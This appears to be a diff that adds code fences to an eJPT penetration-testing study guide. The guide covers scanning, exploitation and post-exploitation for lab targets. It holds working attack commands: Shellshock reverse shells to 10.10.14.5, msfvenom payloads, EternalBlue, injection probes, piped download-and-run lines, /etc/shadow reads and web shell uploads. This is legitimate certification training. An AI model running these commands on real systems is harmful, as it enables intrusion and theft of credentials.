@@ -61,7 +61,7 @@ The eJPT methodology follows these 5 phases in order:
 
 ### **⚙️ Essential Tools Setup:**
 
-bash
+```bash
 # Check your tools are ready
 which nmap && echo "nmap: OK" || echo "nmap: MISSING"
 which metasploit-framework && echo "msf: OK" || echo "msf: MISSING"
@@ -71,7 +71,7 @@ which enum4linux && echo "enum4linux: OK" || echo "enum4linux: MISSING"
 # Update tool databases
 sudo updatedb
 sudo msfdb init
-
+```
 
 ---
 
@@ -87,7 +87,7 @@ sudo msfdb init
 
 #### **Step 1: Network Discovery**
 
-bash
+```bash
 # Find live hosts (most important first step)
 nmap -sn 192.168.1.0/24
 # Expected output: List of IP addresses that respond
@@ -96,7 +96,7 @@ nmap -sn 192.168.1.0/24
 arp-scan -l
 netdiscover -r 192.168.1.0/24
 masscan -p1-1000 192.168.1.0/24 --rate=1000
-
+```
 
 **What This Shows:**
 - Which systems are online and reachable
@@ -105,7 +105,7 @@ masscan -p1-1000 192.168.1.0/24 --rate=1000
 
 #### **Step 2: Port Scanning**
 
-bash
+```bash
 # Quick scan for common ports (fast initial scan)
 nmap -F 10.10.10.5
 # Expected output: Common open ports (22, 80, 135, 445, etc.)
@@ -117,11 +117,11 @@ nmap -p- 10.10.10.5
 # Service detection (get detailed service info)
 nmap -sV -p 22,80,135,445 10.10.10.5
 # Expected output: Service names and versions
-
+```
 
 #### **Step 3: Service Enumeration**
 
-bash
+```bash
 # Web services enumeration
 whatweb http://10.10.10.5
 dirb http://10.10.10.5 /usr/share/dirb/wordlists/common.txt
@@ -134,11 +134,11 @@ nmap --script smb-enum* 10.10.10.5
 
 # SSH enumeration
 nmap --script ssh-enum* 10.10.10.5
-
+```
 
 ### **📝 Phase 1 Deliverables:**
 
-markdown
+```markdown
 # Information Gathering Results
 
 ## Network Discovery:
@@ -157,7 +157,7 @@ Host: 10.10.10.5
 - Web server: Apache 2.4.41 with PHP
 - SMB shares: IPC$, C$, Admin$
 - SSH: Allows password authentication
-
+```
 
 ---
 
@@ -173,7 +173,7 @@ Host: 10.10.10.5
 
 #### **Step 1: Automated Vulnerability Scanning**
 
-bash
+```bash
 # General vulnerability scan
 nmap --script vuln 10.10.10.5
 # Expected output: CVE numbers and vulnerability details
@@ -186,11 +186,11 @@ nmap --script=smb-vuln* 10.10.10.5
 nmap --script=http-vuln* 10.10.10.5
 nikto -h http://10.10.10.5
 # Expected output: Web app vulnerabilities and misconfigurations
-
+```
 
 #### **Step 2: Manual Vulnerability Testing**
 
-bash
+```bash
 # Directory traversal test
 curl "http://10.10.10.5/index.php?page=../../../etc/passwd"
 # Expected output: System files or error messages
@@ -202,11 +202,11 @@ curl "http://10.10.10.5/login.php?id=1' OR '1'='1"
 # Command injection test
 curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"
 # Expected output: Command execution results
-
+```
 
 #### **Step 3: Exploit Research**
 
-bash
+```bash
 # Search for exploits
 searchsploit apache 2.4.41
 searchsploit ms17-010
@@ -215,7 +215,7 @@ searchsploit CVE-2017-0143
 # Metasploit search
 msfconsole -q -x "search ms17-010"
 msfconsole -q -x "search apache"
-
+```
 
 ### **🎯 Risk Assessment Matrix:**
 
@@ -240,7 +240,7 @@ msfconsole -q -x "search apache"
 
 #### **Step 1: Metasploit Exploitation**
 
-bash
+```bash
 # Start Metasploit
 msfconsole -q
 
@@ -254,11 +254,11 @@ exploit
 # Expected result: Meterpreter session
 meterpreter > getuid
 # Output: NT AUTHORITY\SYSTEM
-
+```
 
 #### **Step 2: Manual Exploitation**
 
-bash
+```bash
 # Shellshock exploitation
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" \
   http://10.10.10.5/cgi-bin/test.cgi
@@ -269,11 +269,11 @@ nc -nlvp 4444 &
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" \
   http://10.10.10.5/cgi-bin/test.cgi
 # Expected result: Reverse shell connection
-
+```
 
 #### **Step 3: Shell Improvement**
 
-bash
+```bash
 # Upgrade to better shell (Linux)
 python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -286,11 +286,11 @@ whoami
 pwd
 id
 uname -a
-
+```
 
 ### **🔄 Payload Generation:**
 
-bash
+```bash
 # Create additional payloads
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f elf > shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=6666 -f exe > meter.exe
@@ -298,7 +298,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=6666 -f e
 # Transfer files to target
 python3 -m http.server 8080
 # On target: wget http://10.10.14.5:8080/shell
-
+```
 
 ---
 
@@ -314,7 +314,7 @@ python3 -m http.server 8080
 
 #### **Step 1: Privilege Escalation (Linux)**
 
-bash
+```bash
 # System information gathering
 uname -a
 cat /etc/issue
@@ -331,11 +331,11 @@ sudo -l
 
 # Automated enumeration
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
+```
 
 #### **Step 2: Privilege Escalation (Windows)**
 
-powershell
+```powershell
 # System information
 systeminfo
 whoami /all
@@ -348,11 +348,11 @@ wmic service list brief
 
 # Automated escalation check
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
-
+```
 
 #### **Step 3: Data Collection**
 
-bash
+```bash
 # Important file locations (Linux)
 cat /etc/passwd
 cat /etc/shadow  # (requires root)
@@ -363,11 +363,11 @@ find / -name "*password*" 2>/dev/null
 dir "C:\Users\" /s
 dir "C:\Program Files\" /s
 type "C:\Windows\System32\drivers\etc\hosts"
-
+```
 
 ### **🔄 Lateral Movement:**
 
-bash
+```bash
 # Network discovery from inside
 arp -a
 netstat -rn
@@ -376,7 +376,7 @@ ip route show
 # Scan internal network
 ./nmap -sn 192.168.100.0/24
 ./nmap -p 22,135,445,3389 192.168.100.1-50
-
+```
 
 ---
 
@@ -392,7 +392,7 @@ ip route show
 
 #### **Step 1: Evidence Organization**
 
-bash
+```bash
 # Create evidence folders
 mkdir -p ejpt_evidence/{recon,vulns,exploits,post_exploit}
 mkdir -p ejpt_evidence/screenshots/{phase1,phase2,phase3,phase4}
@@ -402,11 +402,11 @@ history > ejpt_evidence/command_history.txt
 
 # Create findings summary
 echo "eJPT Assessment Summary - $(date)" > ejpt_evidence/summary.txt
-
+```
 
 #### **Step 2: Report Template**
 
-markdown
+```markdown
 # Penetration Testing Report
 
 ## Executive Summary
@@ -430,7 +430,7 @@ markdown
 1. **Immediate:** Apply security patches for MS17-010
 2. **Short-term:** Update web server and disable CGI if not needed
 3. **Long-term:** Implement network segmentation and monitoring
-
+```
 
 ---
 
@@ -447,7 +447,7 @@ markdown
 
 #### **Question Distribution:**
 
-markdown
+```markdown
 ## eJPT Content Breakdown
 
 ### Information Gathering (20% - 7 questions)
@@ -508,7 +508,7 @@ wget http://attacker/file       # Download files
 - Evidence collection
 - Finding documentation
 - Risk assessment
-
+```
 
 ### **🏆 Common Exam Scenarios:**
 
@@ -555,7 +555,7 @@ wget http://attacker/file       # Download files
 
 #### **72-Hour Timeline:**
 
-markdown
+```markdown
 # Day 1 (24 hours): Discovery and Analysis
 Hours 1-8:   Complete network enumeration
 Hours 9-16:  Vulnerability assessment and research
@@ -569,7 +569,7 @@ Hours 41-48: Lateral movement and data collection
 # Day 3 (24 hours): Documentation and Questions
 Hours 49-60: Organize evidence and findings
 Hours 61-72: Answer exam questions and review
-
+```
 
 ### **🎯 Success Tips:**
 
@@ -593,7 +593,7 @@ Hours 61-72: Answer exam questions and review
 
 ### **💡 Quick Commands for Copy-Paste:**
 
-bash
+```bash
 # Host discovery
 nmap -sn 10.10.10.0/24
 
@@ -622,7 +622,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 # File transfer
 python3 -m http.server 8080
 wget http://10.10.14.5:8080/file
-
+```
 
 ---
 
@@ -630,7 +630,7 @@ wget http://10.10.14.5:8080/file
 
 ### **Lab Setup:**
 
-markdown
+```markdown
 # Target Environment
 Network: 10.10.10.0/24
 Objective: Complete penetration test
@@ -641,11 +641,11 @@ Time Limit: 8 hours (practice scenario)
 - No credentials provided
 - Test all discovered systems
 - Document all findings
-
+```
 
 ### **Phase 1: Information Gathering (90 minutes)**
 
-bash
+```bash
 # Host discovery
 $ nmap -sn 10.10.10.0/24
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-15 10:00 EST
@@ -692,11 +692,11 @@ Share Enumeration on 10.10.10.15
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
         backup          Disk      Backup Files
-
+```
 
 ### **Phase 2: Vulnerability Assessment (60 minutes)**
 
-bash
+```bash
 # Vulnerability scanning
 $ nmap --script vuln 10.10.10.5
 PORT   STATE SERVICE
@@ -715,11 +715,11 @@ PORT    STATE SERVICE
 |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2017-0143
-
+```
 
 ### **Phase 3: Exploitation (120 minutes)**
 
-bash
+```bash
 # Shellshock exploitation
 $ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" \
   http://10.10.10.5/cgi-bin/test.cgi
@@ -747,11 +747,11 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
-
+```
 
 ### **Phase 4: Post-Exploitation (90 minutes)**
 
-bash
+```bash
 # Linux privilege escalation
 bash-4.2$ sudo -l
 User apache may run the following commands on this host:
@@ -774,11 +774,11 @@ Mode              Size    Type  Last modified              Name
 meterpreter > download passwords.txt
 [*] Downloading: passwords.txt -> passwords.txt
 [*] Downloaded 1.22 KiB of 1.22 KiB (100.0%): passwords.txt -> passwords.txt
-
+```
 
 ### **Phase 5: Documentation (60 minutes)**
 
-markdown
+```markdown
 # Lab Assessment Results
 
 ## Systems Compromised: 2/4 (50%)
@@ -805,7 +805,7 @@ markdown
 - **Confidentiality:** CRITICAL - Complete data access
 - **Integrity:** HIGH - Admin access allows data modification  
 - **Availability:** HIGH - Systems can be shut down
-
+```
 
 ---
 
@@ -814,34 +814,34 @@ markdown
 ### **❌ Problem 1: Nmap Not Finding Hosts**
 **What You See:**
 
-bash
+```bash
 $ nmap -sn 10.10.10.0/24
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 256 IP addresses (0 hosts up) scanned
-
+```
 
 **How to Fix:**
 
-bash
+```bash
 # Try different discovery methods
 nmap -Pn 10.10.10.0/24          # Skip ping
 nmap -PS22,80,443 10.10.10.0/24 # TCP SYN ping
 arp-scan -l                     # ARP discovery
 masscan -p1-1000 10.10.10.0/24 --rate=1000  # Fast scan
-
+```
 
 ### **❌ Problem 2: Metasploit Exploits Failing**
 **What You See:**
 
-bash
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 [*] Started reverse TCP handler on 10.10.14.5:4444 
 [-] 10.10.10.15:445 - Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode
-
+```
 
 **How to Fix:**
 
-bash
+```bash
 # Check if target is actually vulnerable first
 use auxiliary/scanner/smb/smb_ms17_010
 set RHOSTS 10.10.10.15
@@ -852,7 +852,7 @@ set payload windows/shell_reverse_tcp
 
 # Check target architecture
 nmap -O 10.10.10.15
-
+```
 
 ### **❌ Problem 3: Web Shell Upload Fails**
 **What You See:**
@@ -862,7 +862,7 @@ nmap -O 10.10.10.15
 
 **How to Fix:**
 
-bash
+```bash
 # Check file extension restrictions
 curl -X PUT --data-binary @test.php http://target/test.php
 curl -X PUT --data-binary @test.asp http://target/test.asp
@@ -874,7 +874,7 @@ curl -X PUT --data-binary @test.asp http://target/test.asp
 
 # Test execution
 curl "http://target/shell.php?cmd=id"
-
+```
 
 ### **❌ Problem 4: Shell Connections Drop**
 **What You See:**
@@ -884,7 +884,7 @@ curl "http://target/shell.php?cmd=id"
 
 **How to Fix:**
 
-bash
+```bash
 # Use stable shell technique
 nc -nlvp 4444 &
 # In shell:
@@ -896,7 +896,7 @@ export TERM=xterm
 
 # Use different ports (80, 443, 53)
 nc -nlvp 80
-
+```
 
 ---
 
@@ -904,7 +904,7 @@ nc -nlvp 80
 
 ### **🚀 Essential Commands for Copy-Paste:**
 
-bash
+```bash
 # PHASE 1: INFORMATION GATHERING
 nmap -sn 192.168.1.0/24                    # Host discovery
 nmap -sC -sV -p- target_ip                 # Full service scan
@@ -932,7 +932,7 @@ python3 -m http.server 8080              # File transfer server
 # PHASE 5: DOCUMENTATION
 mkdir ejpt_evidence                       # Create evidence folder
 history > commands.txt                    # Save command history
-
+```
 
 ### **💡 Memory Helpers:**
 - **Phase 1:** Find and Count (hosts, ports, services)
@@ -959,7 +959,7 @@ history > commands.txt                    # Save command history
 
 #### **Discovery Phase Integration:**
 
-bash
+```bash
 # Nmap + Masscan combination
 masscan -p1-65535 192.168.1.0/24 --rate=1000 > masscan_results.txt
 nmap -sV -p $(cat masscan_results.txt | grep open | cut -d/ -f1 | tr '\n' ',') target_ip
@@ -969,11 +969,11 @@ whatweb http://target | tee whatweb.txt
 dirb http://target /usr/share/dirb/wordlists/common.txt | tee dirb.txt
 gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt
 nikto -h http://target | tee nikto.txt
-
+```
 
 #### **Exploitation Chain:**
 
-bash
+```bash
 # Manual to Metasploit transition
 # 1. Manual verification
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://target/cgi-bin/test.cgi
@@ -984,11 +984,11 @@ msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST
 # 3. Shell improvement
 # In meterpreter: shell
 python -c 'import pty; pty.spawn("/bin/bash")'
-
+```
 
 #### **Post-Exploitation Integration:**
 
-bash
+```bash
 # Privilege escalation tool chain
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 python3 -m http.server 8080 &
@@ -997,7 +997,7 @@ python3 -m http.server 8080 &
 # Windows enumeration chain
 # Upload PowerUp.ps1
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker:8080/PowerUp.ps1'); Invoke-AllChecks"
-
+```
 
 ---
 
@@ -1005,7 +1005,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://a
 
 ### **📋 Quick Findings Template:**
 
-markdown
+```markdown
 # eJPT Assessment - Quick Results
 
 ## Target Environment
@@ -1033,11 +1033,11 @@ markdown
 - [ ] Extract sensitive data for impact demonstration
 - [ ] Document all findings with screenshots
 - [ ] Prepare final report
-
+```
 
 ### **🔧 Technical Details Template:**
 
-markdown
+```markdown
 ## Technical Exploitation Details
 
 ### Vulnerability: [Name]
@@ -1046,33 +1046,36 @@ markdown
 **Affected System:** [IP address]
 
 #### Discovery
-bash
+```bash
 # Commands used to find vulnerability
 nmap --script vuln target_ip
 # Results showing vulnerability confirmation
+```
 
 #### Exploitation
-bash
+```bash
 # Step-by-step exploitation process
 msfconsole
 use exploit/path/to/exploit
 set RHOSTS target_ip
 exploit
 # Results and proof of compromise
+```
 
 #### Impact Demonstration
-bash
+```bash
 # Commands showing access and control
 whoami
 id
 uname -a
 # Screenshots and evidence files
+```
 
 #### Remediation
 - **Immediate:** [emergency actions]
 - **Short-term:** [fixes within 1 month]
 - **Long-term:** [strategic improvements]
-
+```
 
 ---
 
@@ -1097,7 +1100,7 @@ uname -a
 
 ### **🔧 Local Lab Setup:**
 
-bash
+```bash
 # Create practice environment
 # Download VirtualBox/VMware
 # Get Kali Linux VM
@@ -1110,7 +1113,7 @@ bash
 # Host-only network: 192.168.56.0/24
 # Kali: 192.168.56.100
 # Targets: 192.168.56.101-110
-
+```
 
 ---
 
@@ -1144,7 +1147,7 @@ bash
 
 ### **📊 Daily Practice Routine:**
 
-markdown
+```markdown
 # Morning Session (60 minutes)
 - 20 minutes: Theory review
 - 30 minutes: Tool practice
@@ -1154,7 +1157,7 @@ markdown
 - 60 minutes: Hands-on lab work
 - 20 minutes: Documentation practice
 - 10 minutes: Progress review
-
+```
 
 ### **✅ Readiness Checklist:**
 - [ ] Can complete host discovery in under 5 minutes
@@ -1171,22 +1174,22 @@ markdown
 
 ### **When Tools Don't Work:**
 
-bash
+```bash
 # Tool verification
 which nmap metasploit-framework dirb enum4linux
 # Update everything
 sudo apt update && sudo apt upgrade
 sudo msfdb init
-
+```
 
 ### **Network Connectivity Issues:**
 
-bash
+```bash
 # Basic connectivity tests
 ping target_ip
 traceroute target_ip
 nmap -Pn target_ip
-
+```
 
 ### **Getting Unstuck:**
 1. **Read error messages carefully**
